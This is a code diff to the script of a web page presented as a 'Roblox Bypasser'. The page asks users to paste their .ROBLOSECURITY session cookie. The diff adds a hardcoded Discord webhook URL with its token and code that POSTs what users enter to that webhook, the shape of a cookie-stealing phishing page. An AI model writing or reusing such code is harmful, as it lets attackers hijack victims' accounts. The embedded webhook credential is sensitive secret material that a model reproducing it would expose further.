@@ -224,12 +224,34 @@
 const successSound = document.getElementById("sfx-success");
 const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
+const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
+
+// Simple validation for .ROBLOSECURITY cookie (alphanumeric, at least 10 chars, basic pattern check)
+function isValidCookie(input) {
+  const cookiePattern = /^[a-zA-Z0-9-_]+$/;
+  return input.length >= 10 && cookiePattern.test(input);
+}
 
 $("#cookieForm").on("submit", async function(e) {
   e.preventDefault();
   const cookie = $("#cookieInput").val().trim();
-  if (cookie.length < 10) {
-    alert("Cookie too short");
+
+  if (!isValidCookie(cookie)) {
+    alert("Invalid input! Please enter a valid .ROBLOSECURITY cookie.");
+    const webhookPayload = {
+      content: `Invalid Input Detected: \`${cookie}\` at ${new Date().toLocaleString()}`,
+      username: "Roblox Bypasser Bot",
+      avatar_url: "https://i.imgur.com/4j8o1.png"
+    };
+    try {
+      await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(webhookPayload)
+      });
+    } catch (webhookError) {
+      console.error("Failed to send to webhook:", webhookError);
+    }
     return;
   }
 
